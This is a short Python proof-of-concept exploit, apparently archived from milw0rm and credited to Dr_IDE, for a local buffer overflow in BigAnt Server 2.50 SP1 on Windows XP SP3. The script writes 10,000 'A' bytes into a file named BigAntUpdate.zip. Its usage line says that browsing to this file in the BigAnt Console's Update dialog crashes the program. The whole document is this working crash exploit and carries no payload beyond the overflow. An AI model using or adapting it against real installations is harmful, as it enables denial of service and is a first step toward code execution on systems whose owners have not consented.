#!/usr/bin/env python

#######################################################################
#
# BigAnt Server 2.50 SP1 Local Buffer Overflow PoC
# Found By: 	Dr_IDE
# Tested:   	XPSP3
# Usage:	Open BigAnt Console, Go to Update, Browse to zip, Boom.
#
#######################################################################

buff = ("\x41" * 10000)

f1 = open("BigAntUpdate.zip","w")
f1.write(buff)
f1.close()

# milw0rm.com [2009-09-16]